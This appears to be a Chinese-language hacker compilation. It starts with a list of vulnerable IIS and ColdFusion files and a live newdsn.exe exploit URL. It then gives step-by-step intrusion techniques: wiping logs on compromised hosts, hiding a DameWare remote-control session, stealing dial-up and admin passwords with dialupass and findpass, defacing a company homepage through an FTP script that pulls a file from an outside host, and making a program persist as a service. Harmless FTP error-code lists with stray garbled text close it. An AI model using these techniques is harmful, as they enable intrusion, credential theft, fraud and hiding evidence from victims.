建议：删除名为/scripts的web目录 
解决方法：删除uploadn.asp文件 
相关连接： 

类型：攻击型 
名字：uploadx.asp 
风险等级：高 
描述：在/scripts/tools目录下存在uploadx.asp程序,只要入侵者有一个 
　　　可用帐号，哪怕是Guest帐号，就可以上传任何文件到你的web目录， 
　　　除了替换主页外，他更可以进一步控制你的整个系统! 
建议：删除名为/scripts的web目录 
解决方法：删除uploadx.asp文件 
相关连接： 

类型：攻击型 
名字：query.asp 
风险等级：低 
描述：在/IISSAMPLES/ExAir/Search/的目录下存在query.asp文件,这个 
　　　文件有个漏洞如果被攻击者利用，后果将导致CPU使用率达到100%， 
　　　机器速度将明显变慢 
建议：禁止对/iissamples目录的存取 
解决方法：删除query.asp文件 

71 
类型：攻击型 
名字：advsearch.asp 
风险等级：低 
描述：在/IISSAMPLES/ExAir/Search/的目录下存在query.asp文件,这个 
　　　文件有个漏洞如果被攻击者利用，后果将导致CPU使用率达到100%， 
　　　机器速度将明显变慢 
建议：禁止对/iissamples目录的存取 
解决方法：删除advsearch.asp文件 

类型：攻击型 
名字：search.asp 
风险等级：低 
描述：在/IISSAMPLES/ExAir/Search/的目录下存在search.asp文件,这个 
　　　文件有个漏洞如果被攻击者利用，后果将导致CPU使用率达到100%， 
　　　机器速度将明显变慢 
建议：禁止对/iissamples目录的存取 
解决方法：删除search.asp文件 

类型：攻击型 
名字：getdrvrs.exe 
风险等级：中 
描述：这个存在于/scripts/tools目录下的getdrvrs.exe文件允许任何一 
　　　个用户在web根目录下创建任何文件,和创建ODBC数据源 
建议：禁止对/scripts/tools目录的匿名访问 
解决方法：删除getdrvrs.exe文件 

类型：攻击型 
名字：newdsn.exe 
风险等级：中 
描述：这个存在于/scripts/tools目录下的newdsn.exe文件允许任何一个 
　　　用户在web根目录下创建任何文件,如: 
http://xxx.xxx.xxx.xxx/scripts/tools/newdsn.exe?driver=Microsoft 
%2BAccess%2BDriver%2B%28*.mdb%29&dsn=Evil2+samples+from+microsoft 
&dbq=..%2F..%2Fwwwroot%2Fevil2.htm&newdb=CREATE_DB&attr= 
建议：禁止对/scripts/tools目录的匿名访问 
解决方法：删除newdsn.exe文件 

类型：信息型 
名字：showcode.asp_3 
风险等级：中 
描述：在/iissamples/exair/howitworks/存在code.asp文件,入侵者利用 
　　　该文件可以查看服务器硬盘上任何一个ASCII文件的内容,并显示asp 
　　　程序文件的源代码 
建议：禁止对/iissamples的web目录的匿名访问 
解决方法：删除showcode.asp文件 

类型：攻击型 
名字：aexp.htr 
风险等级：中 
描述：在/iisadmpwd目录下存在aexp.htr文件,类似的还有aexp2.htr, 
　　　aexp3.htr和aexp4b.htr等,这些文件允许攻击者用穷举法等方式破 
　　　解和修改NT用户的密码。 
建议：建议禁止对/iisadmpwd目录的访问 
解决方法：删除aexp.htr文件 

类型：攻击型 
名字：aexp2.htr 
风险等级：中 
描述：在/iisadmpwd目录下存在aexp2.htr文件,类似的还有aexp2.htr, 
　　　aexp3.htr和aexp4b.htr等,这些文件允许攻击者用穷举法等方式破 
　　　解和修改NT用户的密码。 
建议：建议禁止对/iisadmpwd目录的访问 
解决方法：删除aexp2.htr文件 

类型：攻击型 
名字：aexp3.htr 
风险等级：中 
描述：在/iisadmpwd目录下存在aexp3.htr文件,类似的还有aexp2.htr, 
　　　aexp3.htr和aexp4b.htr等,这些文件允许攻击者用穷举法等方式破 
　　　解和修改NT用户的密码。 
建议：建议禁止对/iisadmpwd目录的访问 
解决方法：删除aexp3.htr文件 

类型：攻击型 
名字：aexp4b.htr 
风险等级：中 
描述：在/iisadmpwd目录下存在aexp4b.htr文件,类似的还有aexp2.htr, 
　　　aexp3.htr和aexp4b.htr等,这些文件允许攻击者用穷举法等方式破 
　　　解和修改NT用户的密码。 
建议：建议禁止对/iisadmpwd目录的访问 
解决方法：删除aexp4b.htr文件 

类型：攻击型 
名字：achg.htr 
风险等级：中 
描述：在/iisadmpwd目录下存在aechg.htr文件,类似的还有aexp2.htr, 
　　　aexp3.htr和aexp4b.htr等,这些文件允许攻击者用穷举法等方式破 
　　　解和修改NT用户的密码。 
建议：建议禁止对/iisadmpwd目录的访问 
解决方法：删除achg.htr文件 

类型：攻击型 
名字：ExprCale.cfm 
风险等级：中 
描述：在Coldfusion的web目录:/cfdocs/expeval/ExprCalc.cfm文件，这 
　　　个文件有个漏洞允许用户读取服务器硬盘上的任意文件包括用户密 
　　　码数据库sam文件 
建议：删除相关的文件 
解决方法：删除ExprCalc.cfm文件 

类型：攻击型 
名字：getfile.cfm 
风险等级：中 
描述：在Coldfusion的web目录:/getfile.cfm文件，这个文件有个漏洞允 
许用户读取服务器硬盘上的任意文件包括用户密码数据库sam文件 
建议：删除相关的文件 
解决方法：删除getfile.cfm文件 

类型：信息型 
名字：x.htw 
风险等级：中 
描述：IIS4.0上有一个应用程序映射htw--->webhits.dll，这是用于Inde 
　　　xServer的点击功能的。尽管你不运行IndexServer，该映射仍然有 
　　　效。这个应用程序映射存在漏洞，允许入侵者读取本地硬盘上的文 
　　　件，数据库文件，和ASP源代码。 
建议在IIS控制台中删除无用的应用程序映射 

类型：信息型 
名字：qfullhit.htw 
风险等级：中 
描述：IIS4.0上有一个应用程序映射htw--->webhits.dll，这是用于Inde 
　　　xServer的点击功能的。尽管你不运行IndexServer，该映射仍然有 
　　　效。这个应用程序映射存在漏洞，允许入侵者读取本地硬盘上的文 
　　　件，数据库文件，和ASP源代码。 
建议：建议在IIS控制台中删除无用的应用程序映射 

类型：信息型 
名字：iirturnh.htw 
风险等级：中 
描述：IIS4.0上有一个应用程序映射htw--->webhits.dll，这是用于Inde 
　　　xServer的点击功能的。尽管你不运行IndexServer，该映射仍然有 
　　　效。这个应用程序映射存在漏洞，允许入侵者读取本地硬盘上的文 
　　　件，数据库文件，和ASP源代码。 
建议：建议在IIS控制台中删除无用的应用程序映射


【clearlogs】


清除日志(二)


===================================
1.系统日志 通过手工很难清除. 这里我们介绍一个工具 clearlog.exe

使用方法:
Usage: clearlogs [\\computername] <-app / -sec / -sys>

       -app = 应用程序日志
       -sec = 安全日志
       -sys = 系统日志
a. 可以清除远程计算机的日志
** 先用ipc连接上去: net use \\ip\ipc$ 密码/user:用户名
** 然后开始清除: 方法  
	clearlogs \\ip -app 这个是清除远程计算机的应用程序日志
	clearlogs \\ip -sec 这个是清除远程计算机的安全日志
	clearlogs \\ip -sys 这个是清除远程计算机的系统日志

b.清除本机日志: 如果和远程计算机的不能空连接. 那么就需要把这个工具传到远程计算机上面
  然后清除.  方法:

	clearlogs  -app 这个是清除远程计算机的应用程序日志
	clearlogs  -sec 这个是清除远程计算机的安全日志
	clearlogs  -sys 这个是清除远程计算机的系统日志

安全日志已经被清除.Success: The log has been cleared  成功.

为了更安全一点.同样你也可以建立一个批处理文件.让自动清除. 做好批处理文件.然后用at命令建立一个计划任务. 让自动运行. 之后你就可以离开你的肉鸡了. 
例如建立一个 c.bat

rem ============================== 开始
@echo off
clearlogs -app
clearlogs -sec
clearlogs -sys
del clearlogs.exe
del c.bat
exit
rem ============================== 结束

在你的计算机上面测试的时候 可以不要 @echo off  可以显示出来. 你可以看到结果
第一行表示: 运行时不显示窗口
第二行表示: 清除应用程序日志
第三行表示: 清除安全日志
第四行表示: 清除系统日志
第五行表示: 删除 clearlogs.exe 这个工具
第六行表示: 删除 c.bat 这个批处理文件
第七行表示: 退出

用AT命令. 建立一个计划任务. 这个命令在原来的教程里面和杂志里面都有. 你可以去看看详细的使用方法

AT 时间 c:\c.bat

之后你就可以安全离开了. 这样才更安全一点.

===================================
2.清除iis日志:
工具:cleaniis.exe
使用方法:
iisantidote <logfile dir> <ip or string to hide>
iisantidote <logfile dir><ip or string to hide> stop
stop opiton will stop iis before clearing the files and restart it after
<logfile dir> exemple : c:\winnt\system32\logfiles\w3svc1\ dont forget the \

使用方法解释:
cleaniis.exe iis日志存放的路径 清除参数

什么意思呢？？我来给大家举个例子吧： 
cleaniis c:\winnt\system32\logfiles\w3svc1\ 192.168.0.1
这个表示清除log中所有此IP(192.168.0.1)地址的访问记录.   -----推荐使用这种方法

cleaniis c:\winnt\system32\logfiles\w3svc1\ /shop/admin/ 
这个表示清除这个目录里面的所以的日志

c:\winnt\system32\logfiles\w3svc1 代表是iis日志的位置(windows nt/2000) 这个路径可以改变
c:\windows\system32\logfiles\w3svc1 代表是iis日志的位置(windows xp/2003) 这个路径可以改变

这个测试表示 在日志里面没有这个ip地址. 
我们看一下日志的路径   再来看一下
我们的ip(192.168.0.1)已经没有了.
已经全部清空.


同样这个也可以建立批处理. 方法同上面的那个.

===================================
3.清除历史记录及运行的日志:
cleaner.exe
直接运行就可以了.

===================================
4.察看blackice的日志.
这个地方我们可以清除的看到  防火墙的日志.

这个表示 有人发过来带有病毒的email附件.  ip是: 220.184.153.116 
tcp_probe_other  表示 通过tcp 扫描 或者利用别的和你建立连接 通信
这个表示通过端口 80 扫描iis
病毒 nimda
这里需要很多的计算机协议知识. 同时也需要对英语有了解
才能更好的分析 如果对英语不好 你可以装一个金山词霸. 
一般情况下 我们可以 对一些可以不用管. 
一般这三种情况 不用去管. 
最上面的 critical 这个  可以去关注一下 . 一般是确实有别的计算机扫描或者入侵你的计算机

count 代表次数   intruder 是对方的ip  event 是通过什么方式(协议) 扫描或者想入侵的 
time表示时间



5.===================================
netstat -an 表示什么意思?
使用这个命令可以察看到和本机的所有的连接.

Proto  Local Address          Foreign Address        State
协议   本地端口及IP地址       远程端口及IP地址      状态

LISTENING  监听状态  表示等待对方连接

ESTABLISHED  正在连接着.

TCP  协议是TCP

UDP  协议是UDP

TCP    192.168.0.10:1115      61.186.97.54:80        ESTABLISHED
这个表示  利用tcp协议 本机ip(192.168.0.10)通过端口:1115 和远程ip(61.186.97.54)端口:80连接
80端口 表示  http  就是你在访问这个网站. 

一般情况下远程ip的端口: 80 21 8000 这个都是正常的. 如果是别的 就可以看一下你的计算机了.






【DameWare NT Utilities 隐藏图标】
打开INI文件， 打开INI文件后， 里面添加上如下文字：



[Settings] 
Port=6129 
Adgang NTLM=Yes 
Adgang 1= 
Adgang 2= 
Adgang 3=0 
Notify On New Connection=No
Permission Required=No 
Show SysTray Icon=No 
Permission Required for non Admin=Yes 
On Disconnect Logoff Desktop=No 
Force Applications Close=No 
On Disconnect Lock Workstation=No 
Logon At Logon Desktop Only=No 
Enable Add Client Connection Menu=Yes 
Enable Disconnection Menu=Yes 



里面有好多东东不管他,把上面面这段加到前面,存盘退出. 


【dialupass】
可以上传Dialupass工具到对方硬盘，在PcShare的超级终端里输入如下命令：

Dialupass.exe/alluser /stext "c:\1.txt"

然后到C盘的1.txt里找到帐户和密码，然后按照上面开反向跳板的方法进入互联星空登陆，就可以消费了.


【DOS下修改属性】
  attrib

这个命令是设置文件属性的。如果你想黑一个站，而他的主页的文件属性设置了只读，那就很可怜呀，想删除他也不行，想覆盖他也不行。倒！不过有这个命令就别怕了。 attrib -r index.htm

这个命令是把index.htm的只读属性去掉。

如果把“-”改为“+”则是把这个文件的属性设置为只读



【DOS下常用的FTP命令】
新手要进步，老停留在图形界面软件上是不行的，一定要逐步熟悉一些DOS命令。往肉鸡上传文件的途径很多，FTP就是其中之一，下面就是最常用的几条FTP命令：

开始-运行 里输入ftp后就可以使用下面的命令了：
1. open：与ftp服务器相连接； 
2. send(put)：上传文件； 
3. get：下载文件； 
4. mget：下载多个文件； 
5. cd：切换目录； 
6. dir：查看当前目录下的文件； 
7. del：删除文件； 
8. bye：中断与服务器的连接。 




【echo命令小解】
echo命令主要功能简单点说就是 开启或关闭批处理命令行显示在屏幕上 它是批文件的令  属于内部命令 内部命令就是常驻于内存的命令 在任意路径下输入均执行 

echo命令的目的有两个:
1.避免不需要的命令显示来干扰屏幕
2.在屏幕上给用户显示提示信息  如:我们在dos下常见的提示 "请插入A盘"

用不带参数的echo命令 则显示当前的echo状态信息 

在以前的版本是没有的 在dos 3.3后的版本又增加了一个显示空串效果的命令 : echo+  可以利用该命令在显示中跳过一行,在建批处理命令中有实际上的意义 如:我们想独行显示 请插入A盘   则我们可以在 请插入A盘 前一句末尾添加echo+ 则可以在下一行显示该句了  大家把下面新建为txt后该为bat在dos下试试

@echo off
echo+
echo 牛族牛族!!!最牛的族!!!!!!!!!!!!!!
echo+
pause
echo draper!!!  >a.txt
echo draper is winner!!!!!>> a.txt
a.txt
del a.txt

很简单 为了让你给好的理解

下面再给讲讲和unicode漏洞有关的echo命令 以前有人写了 我再解释一下 

echo [message]>[file name] 这个命令是把指定的字符串送到指定的文件中

注意我的说明:
“>>”将把内容将填加到文件中，“>”将原文件内容覆盖

比如我前几天我利用unicode漏洞后顺利进入台湾的一家公司的主页后 这样进行:
echo open upload.51.com> c:\draper.txt 
echo draper >> c:\draper.txt 
echo draper >> c:\draper.txt 
echo get index.htm c:\inetpub\wwwroot\index.htm+>>+c:\draper.txt 
ftp -s:c:\draper.txt
del  c:\draper.txt
bye

 
强调一下:del一句一定记得 不然别人很容易的看到你的密码. 还有index.htm是你预先设计好的  用bye最后退出FTP对话  呵呵黑主页就那么几招.进行上面的步骤有个前提 就是你已经拿到了admin的权限  

好了,说到这里阿  不懂的慢慢理解!!!!!draper is winner!!!!!

ECHO命令的使用
1． 作为控制批处理命令在执行时是否显示命令行自身的开关 

格式：ECHO [ON|OFF]

如果想关闭“ECHO OFF”命令行自身的显示，则需要在该命令行前加上“@”。

2． 显示当前ECHO设置状态 

格式：ECHO

3． 输出提示信息 

格式：ECHO信息内容

上述是ECHO命令常见的三种用法，也是大家熟悉和会用的，但作为DOS命令淘金者你还应该知道下面的技巧：

4． 关闭DOS命令提示符 

在DOS提示符状态下键入ECHO OFF，能够关闭DOS提示符的显示使屏幕只留下光标，直至键入ECHO ON，提示符才会重新出现。

5． 输出空行，即相当于输入一个回车 

格式：ECHO．

值得注意的是命令行中的“．”要紧跟在ECHO后面中间不能有空格，否则“．”将被当作提示信息输出到屏幕。另外“．”可以用，：；”／[\]＋等任一符号替代。

在下面的例子中ECHO．输出的回车，经DOS管道转向作为TIME命令的输入，即相当于在TIME命令执行后给出一个回车。所以执行时系统会在显示当前时间后，自动返回到DOS提示符状态：

C:>ECHO.|TIME

ECHO命令输出空行的另一个应用实例是：将ECHO．加在自动批处理文件中，使原本在屏幕下方显示的提示画面，出现在屏幕上方。

6． 答复命令中的提问 

格式：ECHO答复语|命令文件名

上述格式可以用于简化一些需要人机对话的命令（如：CHKDSK／F；FORMAT Drive:；del *.*）的操作，它是通过DOS管道命令把ECHO命令输出的预置答复语作为人机对话命令的输入。下面的例子就相当于在调用的命令出现人机对话时输入“Y”回车：

C:>ECHO Y|CHKDSK/F

C:>ECHO Y|DEL A :*.*

7． 建立新文件或增加文件内容 

格式：ECHO 文件内容＞文件名

ECHO 文件内容＞＞文件名

例如：C:>ECHO @ECHO OFF>AUTOEXEC.BAT建立自动批处理文件

C:>ECHO C:\CPAV\BOOTSAFE>>AUTOEXEC.BAT向自动批处理文件中追加内容

C:TYPE AUTOEXEC.BAT显示该自动批处理文件

@ECHO OFF

C:\CPAV\BOOTSAFE

8． 向打印机输出打印内容或打印控制码 

格式：ECHO 打印机控制码＞PRN

ECHO 打印内容＞PRN

下面的例子是向M－1724打印机输入打印控制码。＜Alt＞156是按住Alt键在小键盘键入156，类似情况依此类推：

C:>ECHO +156+42+116>PRN（输入下划线命令FS＊t）

C:>ECHO +155@>PRN（输入初始化命令ESC@）

C:>ECHO.>PRN（换行）

9． 使喇叭鸣响 

C:>ECHO ^G

“^G”是用Ctrl＋G或Alt＋007输入，输入多个^G可以产生多声鸣响。使用方法是直接将其加入批处理文件中或做成批处理文件调用。

10．执行ESC控制序列修改屏幕和键盘设置 

我们知道DOS的设备驱动程序ANSI.SYS提供了一套用来修改屏幕和键盘设置的ESC控制序列。如执行下述内容的批处理程序可以把功能键F12定义为DOS命令“DIR／W”，并把屏幕颜色修改为白色字符蓝色背景。

@ECHO”←[0;134;”DIR/W”;13p

@ECHO”←[1;37;44m

（注：批处理文件中“←”字符的输入方法是在编辑状态下按Alt中小键盘上的27）

【EXE文件 变成 服务】
打开命令行程序CMD.exe (或命令行窗口)。  
输入: c:\>instsrv "服务的名称" c:\winnt\srvany.exe 回车  
运行注册表程序 regedit.exe  
建立 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\"服务的名称" 子项。  
选"服务的名称"，按右键，新建“项”。  
取名: Parameters 。  
选择 Parameters 项，再新建“字符串值”。  
“字符串值”取名: Application 。  
改 Application的值为应用程序的路径及文件名(比如 C:\winnt\i386.exe) 。  
选择 Parameters 项，再新建“字符串值”。  
“字符串值”取名: AppDirectory 。  
改 Application的值为应用程序的路径 (比如 C:\winnt) 。  
关闭注册表程序，打开控制面板-〉管理工具-〉服务。  
选择"服务的名称"，选择“属性”。  
选择"登陆"页,在"允许服务与桌面交互"前打勾。  
启动服务。ok!  
如果出现命令行程序界面， 
则把"允许服务与桌面交互"前的勾去掉，然后重新启动服务。

【findpass】
2 强强联手――Pulist和findpass配合盗取密码 
　　适用点：肉鸡上当前登录的账户是系统管理员。 
　　特点：可立即得到当前登录的管理员账户和密码。 
　　如果我们来不及等到肉鸡重启或只想得到当前管理员密码，那么“Pulist”和“findpass”这两个小工具就可以派上用场了。 
　　当管理员以图形界面方式登录系统时，登录的域名和用户名以明文方式存储在Winlogon进程里，findpass就是利用Winlogon的PID号和正确的域名在加密的内存中寻找密文，然后再把密码从中还原出来，这样我们就能得到管理员密码。 
　　首先，在肉鸡上建立一个文件夹（如“C:\pass”），把这两个工具上传到该文件夹中。上传成功后进入肉鸡的命令提示符窗口，用“CD”命令进入“pass”文件夹。 
　　接着输入“Pulist”，程序会把当前系统运行的进程显示出来，并标明PID号。我们需要在其中找到两样东西，即“Winlogon”进程的PID号（这里是652）和当前管理员登录的域和账户名（这里是AJ和jie）。 

　　然后输入“findpass”，使用格式为“findpass 域 用户名 Winlogon的PID值”的命令，在命令提示符窗口中输入“findpass AJ jie 652”并回车即可。在“The logon information is”后面显示的“66795863”就是我们所需要的密码。 
　　提示：findpass只对以图形登录方式进行登录的管理员账号有效

【FTP反馈信息集锦】
FTP反馈信息集锦  
［ 作者：阿榕收集整理    转贴自：阿榕论坛    点击数：483    更新时间：2004-2-29    文章录入：阿榕 ］ 
 
FTP术语 
150　　　 文件状态良好，打开数据连接 
200　　　 命令成功 
202　　　 命令未实现 
211　　　 系统状态或系统帮助响应 
212　　　 目录状态 
213　　　 文件状态 
214　　　 帮助信息，信息仅对人类用户有用 
215　　　 名字系统类型 
220　　　 对新用户服务准备好 
221　　　 服务关闭控制连接，可以退出登录 
225　　　 数据连接打开，无传输正在进行 
226　　　 关闭数据连接，请求的文件操作成功 
227　　　 进入被动模式 
230　　　 用户登录 
250　　　 请求的文件操作完成 
257　　　 创建"PATHNAME" 
331　　　 用户名正确，需要口令 
332　　　 登录时需要帐户信息 
350　　　 请求的文件操作需要进一步命令 
421　　　 连接用户过多 
425　　　 不能打开数据连接 
426　　　 关闭连接，中止传输 
450 　　　请求的文件操作未执行 
451 　　　中止请求的操作：有本地错误 
452 　　　未执行请求的操作：系统存储空间不足 
500 　　　格式错误，命令不可识别 
501 　　　参数语法错误 
502 　　　命令未实现 
503 　　　命令顺序错误 
504　　　 此参数下的命令功能未实现 
530 　　　账号或密码错误 
532 　　　存储文件需要帐户信息 
550 　　　未执行请求的操作 
551　　　 请求操作中止：页类型未知 
552　　　 请求的文件操作中止，存储分配溢出 
553　　　 未执行请求的操作：文件名不合法 

●400－Bad request失败请求错误（最常见的错误之一） 
　　这个问题在于你输入的网址有错误。有可能是你要连接的服务器不能 
识别你要求浏览的文档，或者你没有访问它的权利甚至它根本就是不存在 
的。仔细检查一下你是否将网址写错，包括大小写（一般网址是不分大小 
写的，可是某些特殊文档例外）、符号或是多打了空格。这是最常见的一 
类错误。 

●401－Unauthorized未经过认证的错误 

　　可能是你访问到了有密码保护的站点而你输入的密码不正确。首先你 
要确认是否有访问该网站的权利（通常有用户名和密码），密码是严格区 
分大小写的，一般是不能匿名的。 

●403－Forbidden禁止访问错误 

　　你可能没有权利访问这个文档，有时某些页面是不允许直接访问的（ 
没有炼接到上面的页面），当然也有被口令保护的可能。这时你须要回到 
上一页面输入口令才能够访问。 

●404－Not found没有找到错误（最常见的错误之二） 

　　这是我们经常遇到的访问出错情况。首先可能是你的网址有错误（漏 
字、大小写、符号的差异等），或者是网址最后的扩展名不对，当然也有 
可能是这个地址或者页面根本不存在。 

●500－Server Error服务器错误 

　　通常是对方网页程序设计错误而产生的，可能是正在修改和上传网页 
，等待对方网页纠正错误后再试吧。 

●503－Service unavailable服务不可用错误(常见错误之三) 

　　这也有很多可能性：你的ISP服务器死机，你公司的网关断了（如果你 
通过单位的局域网上网），或者你自己的系统出问题了。最好的办法是等 
一会再试试，如果仍然不行就去看看自己的机器、询问一下网络管理员。 

●Bad file request错误文件请求 

　　你的浏览器要求访问数据域和下拉列表等特殊格式的文件和文档，然 
而访问的页面没有这些表单，或者表单出错。你只有通知管理员更新表单。 

●Socks Error代理服务器出错 
(常见错误之?IMG SRC='/big5/images/smiles/smile_sleepy.gif' ALT='sleepy' WIDTH=15 HEIGHT=15 border=0 ALIGN='absmiddle'> 

　　这是在代理环境下客户机上最常见的错误，原因是：连接超时、代理 
服务器已经关闭或连线已经断开。咨询服务器管理员查找相应的错误并对 
照解决。 

●Request time out连接超时错误(常见错误之五) 

　　连接超时，主要原因可能是你的网络速度太差，或者你在浏览器中设 
置了超时时间选项，也可能是因为服务器的问题，多试试看。 

●An Unexpected Web Error Occurred不可预知的网页错误 

　　发生此错误的原因很多，没有任何详细的解释和解决办法。只有采用 
上面说的逐级访问父目录的办法，或者放弃。 

●Cannot add form submission result to bookmark list无法将表单结 
果加入书签列表 

　　当你通过搜索找到一堆网址，想把结果存到书签中，由于你得到的可 
能是一个动态的网页，不能够将它加到书签上。你可以将结果页面作为一 
个HTML文件存到你的硬盘上。 

●Failed DNS lookup　DNS查找失败错误 

　　DNS（Domain Name System域名管理系统）用于将网址翻译成合法的 
因特网物理地址，出现这种错误可能是你输入地址有错误，检查一下输 
入的地址，然后重新试试。 

●File contains no data文件无内容错误 

　　你访问的站点没错，但没有Web页面，只有重试几次看看。 

●Connection refused by host主机拒绝连接 

　　可能是你无权访问这个站点，或者它拒绝你的IP（或者IP段）访问， 
也有可能是口令保护造成的。 

●Viewer not found找不到查看器错误 

　　网上有多种格式的文件，比如声音文件、压缩文件、动画文件等。如 
果你的浏览器没有定义相关的软件就不能够访问。简单的解决方法就是下 
载并安装相关的软件。 

●Unable to locate the server不能定位服务器错误 

　　可能你输入的网址有问题，或者服务器不存在，或者是服务器已经被 
取消了（这时一般会有一个页面提示你转到相应的页面）。重新检查一下 
你输入的地址，重试一下。 

●Host unavailable主机不可用错误 

　　有可能主机死机了。稍等一会，重新刷新再看看。 

●Network connection was refused by the server服务器拒绝网络连接错误 

　　要求访问A务器的用户太多，无法对你的要求应答。只有不停地刷新 
了再试一试。 

●Host unknown主机找不到错误 

　　通常是服务器死机了，或者是你的网络连接中断所致。 

二、使用FTP、新闻组、Foxmail和OE、CuteFTP、NetAnts中常见的错误和解决 
●Connet:10061没有连接 

　　连接失败或者没有连接，也可能是你要连接的主机根本就不提供FTP服务。 

●Not connet,access deny拒绝连接访问错误 

　　不能匿名登录和访问，你必须提供用户名和密码才能登录。只有去申请 
一个用户名你才能进入主机。 

●Bad target URL目标URL错误 

　　在使用网络蚂蚁NetAnts时最常见的错误，是你的JOB的URL地址有问题， 
可能是你输入有问题，也可能是服务器上连接出错。 

●Too many users用户太多 

　　当你登录FTP时出现的错误。这是由于访问该FTP站点的用户太多所致， 
你可到换个时间段试一试。 

●You can't log on as an anonymous user你不能作为匿名用户登录 

　　有些FTP站点允许通过匿名（就是使用anonymous的用户名和口令）访问 
，但有些仅允许其成员（拥有特定用户名和口令）访问。另外一种可能是你 
的浏览器不支持匿名FTP访问，你可以使用专门的FTP软件（比如CUTEFTP） 
访问。 

●Permission denied拒绝访问 

　　当你试图上传一个文件到FTP站点上时，没有权限或者是站点太忙所致。 

●NNTP server error新闻组服务器错误 

　　当你试图登录一个新闻讨论组时出现的错误，可能是服务器关闭或者连 
接中断引起。 

●Too many connections――try again later太多的连接，等一会再试 
　　这也是由于用户过多产生的错误信息，你换个时间访问吧! 

●Receive and send data error接收或发送数据出错 

　　在使用Foxmail或者Outlook Express时，通常由于线路质量不好，与服 
务器的连接被意外中断所致。 

●Connect server fail连接服务器失败 

　　在使用Foxmail或者Outlook Express时，不能连接到你的邮件服务器。 
请检查你是否已连接到你的ISP或者网络是否已经断开，如果邮件服务器已 
关掉或太忙，也会出现这种情况。 

●Can’t resolve server address不能解析服务器地址 

　　在使用Foxmail或者Outlook Express时，解析服务器地址失败，通常是 
因为DNS服务器未连接，或POP3(SMTP)服务器名字写错，纠正信箱的服务器 
设置参数就可以了。 

●The actual size of downloading file is unknown下载文件大小无法确定 

　　这是NetAnts的一个Bug，因为NetAnts在下载文件前，必须先知道文件 
的大小，出现这个错误的原因是因为服务器的应答中没有包括文件大小。 
在以后版本中会得到改进。 

●Warning The server says 553 sorry,that domain isn’t in my list of allowed reception发送邮箱地址错误 

　　在使用Outlook Express和Foxmail时发生的错误，错误在于SMTP服务器 
不接受你要发送的邮件地址。通常，一些免费的邮件服务器只接受发送给它 
自己的邮件地址。解决办法：更换一个SMTP服务器地址。 

(二) FTP下载错误资讯： 
有很多的朋友不太会看FTP资讯错误，如果下载不了，一定是出了错误，自己要知道是什?地方错了。?什?错。 
下面说说几个非常典型的。 
530，说明密码错误。 
550，说明位址有错误，可能是盗连没有改。 
详细的FTP错误列表 
110 Restart marker reply. In this case, the text is exact and not left to the particular implementation; it must read: MARK yyyy = mmmm where yyyy is User-process data stream marker, and mmmm server's equivalent marker (note the spaces between markers and 重新?动标志回应。这种情况下，资讯是精确的并且不用特别的处理；可以这样看：标记 yyyy = mmm 中 yyyy是 用户进程资料流程标记，mmmm是伺服器端相应的标记（注意在标记和等号间的空格） 
----------------------------------- 
120 Service ready in nnn minutes. 
服务在NNN时间内可用 
----------------------------------- 
125 Data connection already open; transfer starting. 
资料连接已经打开，开始传送资料. 
----------------------------------- 
150 File status okay; about to open data connection. 
文件状态正确，正在打开资料连接. 
----------------------------------- 
200 Command okay. 
命令执行正常结束. 
----------------------------------- 
202 Command not implemented, superfluous at this site. 
命令未被执行，此站点不支援此命令. 
----------------------------------- 
211 System status, or system help reply. 
系统状态或系统帮助资讯回应. 
----------------------------------- 
212 Directory status. 
目录状态资讯. 
----------------------------------- 
213 File status. $XrkxmL= 
文件状态资讯. 
----------------------------------- 
214 Help message.On how to use the server or the meaning of a particular non-standard command. This reply is useful only to the human user. 帮助资讯。关于如何使用本伺服器或特殊的非标准命令。此回复只对人有用。 
----------------------------------- 
215 NAME system type. Where NAME is an official system name from the list in the Assigned Numbers document. 
NAME系统类型。 
----------------------------------- 
220 Service ready for new user. 
新连接的用户的服务已就绪 
----------------------------------- 
221 Service closing control connection. 
控制连接关闭 
----------------------------------- 
225 Data connection open; no transfer in progress. 
资料连接已打开，没有进行中的资料传送 
----------------------------------- 
226 Closing data connection. Requested file action successful (for example, file transfer or file abort). 
正在关闭资料连接。请求文件动作成功结束（例如，文件传送或终止） 
----------------------------------- 
227 Entering Passive Mode (h1,h2,h3,h4,p1,p2). 
进入被动模式 
----------------------------------- 
230 User logged in, proceed. Logged out if appropriate. 
用户已登入。 如果不需要可以登出。 
----------------------------------- 
250 Requested file action okay, completed. _ 
被请求文件操作成功完成 63 
----------------------------------- , 
257 "PATHNAME" created. 
路径已建立 
----------------------------------- 
331 User name okay, need password. , 
用户名存在，需要输入密码 
----------------------------------- 
332 Need account for login. 
需要登陆的账户 
----------------------------------- 
350 Requested file action pending further information U 
对被请求文件的操作需要进一步更多的资讯 
----------------------------------- 
421 Service not available, closing control connection.This may be a reply to any command if the service knows it must shut down. (O&; 
服务不可用，控制连接关闭。这可能是对任何命令的回应，如果服务认?它必须关闭 
----------------------------------- 
425 Can't open data connection. 
打开资料连接失败 
----------------------------------- 
426 Connection closed; transfer aborted. 
连接关闭，传送中止。 
----------------------------------- 
450 Requested file action not taken. 
对被请求文件的操作未被执行 
----------------------------------- 
451 Requested action aborted. Local error in processing. 
请求的操作中止。处理中发生本地错误。 
----------------------------------- 
452 Requested action not taken. Insufficient storage space in system.File unavailable (e.g., file busy). 
请求的操作没有被执行。 系统存储空间不足。 文件不可用 
----------------------------------- 
500 Syntax error, command unrecognized. This may include errors such as command line too long.. 
语法错误，不可识别的命令。 这可能是命令行过长。 
----------------------------------- } 
501 Syntax error in parameters or arguments. 
参数错误导致的语法错误 
----------------------------------- 
502 Command not implemented. 
命令未被执行 
----------------------------------- 
503 Bad sequence of commands. ) 
命令的次序错误。 
----------------------------------- 
504 Command not implemented for that parameter., 
由于参数错误，命令未被执行 
----------------------------------- 
530 Not logged in. 
没有登录 
----------------------------------- 
532 Need account for storing files. 
存储文件需要账户资讯! 
----------------------------------- 
550 Requested action not taken. File unavailable (e.g., file not found, no access). 
请求操作未被执行，文件不可用。 
----------------------------------- | 
551 Requested action aborted. Page type unknown. +.+ 
请求操作中止，页面类型未知 
----------------------------------- 
552 Requested file action aborted. Exceeded storage allocation (for current directory or dataset). 
对请求文件的操作中止。 超出存储分配 
----------------------------------- 
553 Requested action not taken. File name not allowed 
请求操作未被执行。 档案名不允许 
----------------------------------- . 
----------------------------------- 
这种错误跟http协定类似，大致是： 
2开头－－成功 A/ 
3开头－－许可权问题 
4开头－－文件问题 
5开头－－伺服器问题 
例如下面这个例子： 
